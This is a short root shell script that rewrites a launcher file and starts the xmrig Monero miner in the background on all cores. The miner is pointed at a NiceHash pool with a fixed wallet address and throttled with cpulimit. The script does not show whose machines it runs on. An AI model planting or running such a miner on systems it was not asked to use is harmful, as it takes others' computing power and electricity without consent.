#!/bin/sh
./kill_miniZeph.sh
cp -f danielchau.sh mininZeph.sh 
extracted_string=$(sed -n 's/.*-p \([^ ]*\).*/\1/p' /root/danielchau.sh)
cores=$(nproc --all)
limitCPU=$((cores * 80))
cat /dev/null > /root/danielchau.sh
cat >>/root/danielchau.sh <<EOF
#!/bin/bash
sudo /root/xmrig-6.21.0/xmrig --threads=$cores --background -o randomxmonero.auto.nicehash.com:9200 -u NHbVF7wPddHyFthiCiA4yuc6YU916LHbgSJB.$extracted_string -a rx/0 -k
EOF
chmod +x /root/danielchau.sh

sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof xmrig) > /dev/null 2>&1 &" danielchau.sh

./danielchau.sh
